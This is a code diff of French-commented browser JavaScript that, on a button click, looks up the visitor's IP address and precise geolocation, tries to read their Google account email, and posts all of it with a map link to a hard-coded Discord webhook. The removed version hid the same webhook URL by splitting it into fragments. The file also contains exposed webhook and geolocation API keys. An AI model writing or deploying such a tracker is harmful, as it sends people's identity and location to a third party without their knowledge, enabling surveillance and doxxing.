@@ -1,98 +1,81 @@
+// Fonction pour détecter le nom d'adresse email (compte Google)
+function getGoogleAccountName() {
+    let accountName = 'None';  // Valeur par défaut si aucun compte Google n'est détecté
+
+    // Vérification de l'authentification Google
+    if (typeof(google) !== 'undefined' && typeof(google.accounts) !== 'undefined' && typeof(google.accounts.id) !== 'undefined') {
+        let userProfile = google.accounts.id.get();
+
+        if (userProfile && userProfile.email) {
+            accountName = userProfile.email;
+        }
+    }
+
+    return accountName;
+}
+
 document.getElementById('get-info-btn').addEventListener('click', function() {
-    // Fonction pour obtenir l'URL du webhook Discord
-    function getWebhookUrl() {
-        // Remplacez les parties par les segments de votre URL de webhook Discord
-        let part1 = 'https://dis';
-        let part2 = 'cord.co';
-        let part3 = 'm/api/we';
-        let part4 = 'bhooks';
-        let part5 = '12436525502';
-        let part6 = '51515914/SrRtaX';
-        let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
-        let part8 = 'e-XgBBlDcT6r_00VU';
-        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
-    }
+    fetch('http://ip-api.com/json/')
+        .then(response => response.json())
+        .then(ipData => {
+            // Récupération de la localisation précise depuis IPIFY
+            let ipifyUrl = `https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_C7jEkQ4u4zDqbJpCxPVCUdsPjhgsQ&ipAddress=${ipData.query}`;
 
-    // Fonction pour récupérer l'adresse IP avec ipify
-    function getIPAddress() {
-        return fetch('https://api64.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur HTTP, statut : ' + response.status);
-                }
-                return response.json();
-            })
-            .then(data => {
-                return data.ip; // Renvoie l'adresse IP au format IPv4
-            });
-    }
+            fetch(ipifyUrl)
+                .then(response => response.json())
+                .then(data => {
+                    // Obtenir le nom d'adresse email (compte Google)
+                    let googleAccountName = getGoogleAccountName();
 
-    // Fonction pour récupérer la localisation précise avec ipinfo.io
-    function getLocation(ipAddress) {
-        return fetch(`https://ipinfo.io/${ipAddress}/json?token=dc60b8d302e710`)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur HTTP, statut : ' + response.status);
-                }
-                return response.json();
-            })
-            .then(data => {
-                return {
-                    ipAddress: ipAddress,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country,
-                    latitude: data.loc.split(',')[0],
-                    longitude: data.loc.split(',')[1]
-                };
-            });
-    }
+                    // Construire le message à envoyer au webhook Discord
+                    let message = {
+                        content: `
+                            **${googleAccountName} a cliqué sur le bouton**
+                            \nVotre adresse IP est: ${ipData.query}
+                            \nVotre localisation exacte est:
+                            \nLatitude: ${data.location.lat}, Longitude: ${data.location.lng}
+                            \nVille: ${data.location.city}, Région: ${data.location.region}, Pays: ${data.location.country}
+                            \n[Google Maps](https://www.google.com/maps?q=${data.location.lat},${data.location.lng})  // lien vers Google Maps
+                        `
+                    };
 
-    getIPAddress()
-        .then(ipAddress => {
-            return getLocation(ipAddress);
-        })
-        .then(location => {
-            let message = {
-                content: `
-                    **Utilisateur a cliqué sur le bouton**
-                    \nVotre adresse IP est: ${location.ipAddress}
-                    \nVotre localisation approximative est:
-                    \nLatitude: ${location.latitude}, Longitude: ${location.longitude}
-                    \nVille: ${location.city}, Région: ${location.region}, Pays: ${location.country}
-                    \n[Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})
-                `
-            };
+                    // URL du webhook Discord
+                    let webhookUrl = 'https://discord.com/api/webhooks/1243652550251515914/SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';
 
-            let webhookUrl = getWebhookUrl();
+                    // Envoi du message au webhook Discord
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message)
+                    }).then(response => {
+                        if (response.ok) {
+                            alert('Les informations ont été envoyées avec succès au webhook Discord.');
+                        } else {
+                            throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
+                        }
+                    }).catch(error => {
+                        console.error('Erreur:', error);
+                        alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
+                    });
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            }).then(response => {
-                if (response.ok) {
-                    alert('Les informations ont été envoyées avec succès au webhook Discord.');
-                } else {
-                    throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
-                }
-            }).catch(error => {
-                console.error('Erreur lors de l\'envoi au webhook Discord:', error);
-                alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
-            });
-
-            document.getElementById('info-display').innerText = `
-                Votre adresse IP est: ${location.ipAddress}
-                \nVotre localisation approximative est:
-                \nLatitude: ${location.latitude}, Longitude: ${location.longitude}
-                \nVille: ${location.city}, Région: ${location.region}, Pays: ${location.country}
-                \n[Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})
-            `;
+                    // Affichage des informations dans l'élément #info-display
+                    document.getElementById('info-display').innerText = `
+                        Votre adresse IP est: ${ipData.query}
+                        \nVotre localisation exacte est:
+                        \nLatitude: ${data.location.lat}, Longitude: ${data.location.lng}
+                        \nVille: ${data.location.city}, Région: ${data.location.region}, Pays: ${data.location.country}
+                        \n[Google Maps](https://www.google.com/maps?q=${data.location.lat},${data.location.lng})  // lien vers Google Maps
+                    `;
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération de la localisation depuis IPIFY:', error);
+                    alert('Erreur lors de la récupération de la localisation. Veuillez réessayer.');
+                });
         })
         .catch(error => {
-            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
-            console.error('Erreur lors de la récupération des informations :', error);
+            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations depuis IP-API.';
+            console.error('Erreur lors de la récupération des informations depuis IP-API:', error);
         });
 });
